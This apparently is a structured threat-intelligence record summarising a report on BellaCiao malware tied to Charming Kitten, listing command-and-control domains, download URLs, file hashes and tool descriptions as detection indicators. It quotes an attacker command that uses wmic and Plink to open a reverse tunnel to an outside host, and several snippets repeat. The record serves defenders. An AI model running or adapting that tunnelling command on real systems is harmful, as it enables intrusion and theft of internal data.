report_metadata.report_title: Unpacking BellaCiao: A Closer Look at Iran’s Latest Malware

domains.evidence_snippet: The PowerShell script implements the HTTP server for executing commands. It executes the C:\ProgramData\Microsoft\DRMS\JavaUpdateServices.exe for communicating with mail-updateservice[.]info.

The Powershell script implements the HTTP server for executing commands. It executes the C:\ProgramData\Microsoft\Diagnostic\MicrosoftExchangeDiagnosticServices.exe for communicating with maill-support[.]com and msn-center[.]uk.

The Powershell script implements the HTTP server for executing commands. It executes the C:\ProgramData\Microsoft\Diagnostic\MicrosoftExchangeServicesLog.exe for communicating with mailupdate[.]com and msn-service[.]co.

file_hashes.evidence_snippet: The first one was a build of IIS-Raid, a native IIS module (MD5:5a487c41efa2f3055d641591d601977c) downloaded from http://188.165.174[.]199:18080/index.aspx.
The second backdoor was a .NET IIS module for credential exfiltration (MD5: 95c6fdc4f537bccca3079d94e65bc0b0) downloaded from http://188.165.174[.]199:18080/favico.ico.

The Plink tool used for the same purpose but executed using the wmic.exe tool -> wmic /node:127.0.0.1 process call create "c:\windows\temp\Certificates\envisa.exe 88.80.148[.]162 -P 443 -C -R 127.0.0.1:40455:192.168.10.10:1433 -l -pw ".
The PowerShell script implements the HTTP server for executing commands. It executes the C:\ProgramData\Microsoft\DRMS\JavaUpdateServices.exe for communicating with mail-updateservice[.]info.

The PowerShell script implements the HTTP server for executing commands. It executes the C:\ProgramData\Microsoft\Diagnostic\MicrosoftExchangeServicesLog.exe for communicating with mailupdate[.]com and msn-service[.]co.

The Powershell script implements the HTTP server for executing commands. It executes the C:\ProgramData\Microsoft\Diagnostic\MicrosoftExchangeDiagnosticServices.exe for communicating with maill-support[.]com and msn-center[.]uk.
Web shell that implements download and upload of files and command execution.

The Powershell script implements the HTTP server for executing commands. It executes the C:\ProgramData\Microsoft\Diagnostic\MicrosoftExchangeServicesLog.exe for communicating with mailupdate[.]com and msn-service[.]co.

http_paths.evidence_snippet: The dropped .aspx webshell supports 3 operations: Upload, Download, Command execution.

tools.name: BellaCiao
tools.evidence_snippet: During our investigation, we have located multiple BellaCiao samples. Each sample collected was tied up to a specific victim and included hardcoded information such as company name, specially crafted subdomains, or associated public IP address.

tools.name: IIS-Raid
tools.evidence_snippet: The first one was a build of IIS-Raid, a native IIS module (MD5:5a487c41efa2f3055d641591d601977c) downloaded from http://188.165.174[.]199:18080/index.aspx.

tools.name: IIS backdoor
tools.evidence_snippet: The second backdoor was a .NET IIS module for credential exfiltration (MD5: 95c6fdc4f537bccca3079d94e65bc0b0) downloaded from http://188.165.174[.]199:18080/favico.ico.

tools.name: Plink tool
tools.evidence_snippet: The Plink tool is used for establishing reverse proxy connections to the C2 server.

summary: Iranian state-sponsored APT group Charming Kitten has modernized its tactics, techniques, and procedures, including a new malware called BellaCiao. The malware is tailored to suit individual targets and exhibits a higher level of complexity.
